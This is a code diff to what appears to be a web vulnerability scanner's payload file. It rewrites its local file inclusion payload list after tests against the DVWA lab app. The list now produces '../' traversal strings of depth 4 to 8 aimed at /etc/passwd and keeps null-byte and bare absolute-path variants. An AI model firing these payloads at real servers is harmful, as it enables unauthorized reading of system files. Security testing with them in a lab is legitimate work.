@@ -93,15 +93,27 @@ XSS_PAYLOAD_TEMPLATES = [
 
 # --- LFI ----------------------------------------------------------------
 
+# Traversal depth is inherently install-specific -- how many directory
+# levels separate the vulnerable script from filesystem root varies by
+# where the app is deployed. Empirical testing against this DVWA
+# install (sweeping depths 1-6, confirmed via error log ground truth)
+# showed depth 6 is what's actually needed here; the originally assumed
+# depth of 4 never worked regardless of security level, since it's a
+# path-depth problem, not a filtering problem. Multiple depths are
+# included below (4-8) so the detector has a real chance of landing on
+# the right depth on a different install without needing a dynamic
+# sweep -- a known limitation, not a full fix.
+_TRAVERSAL_DEPTHS = [4, 5, 6, 7, 8]
+
 LFI_PAYLOADS = [
-    "../../../../etc/passwd",
-    "....//....//....//etc/passwd",
+    *(("../" * n) + "etc/passwd" for n in _TRAVERSAL_DEPTHS),
     "/etc/passwd%00",
-    "../../../../etc/passwd%00",
+    "../../../../../../etc/passwd%00",
     # Bare absolute path, no traversal at all. Some includes (e.g.
     # `include($_GET['page'])` with no path prefix concatenation) pass
     # this straight through -- confirmed via direct curl testing against
-    # DVWA-low, where traversal payloads returned nothing but this did.
+    # DVWA-low, where traversal payloads at the wrong depth returned
+    # nothing but this did.
     "/etc/passwd",
 ]
 
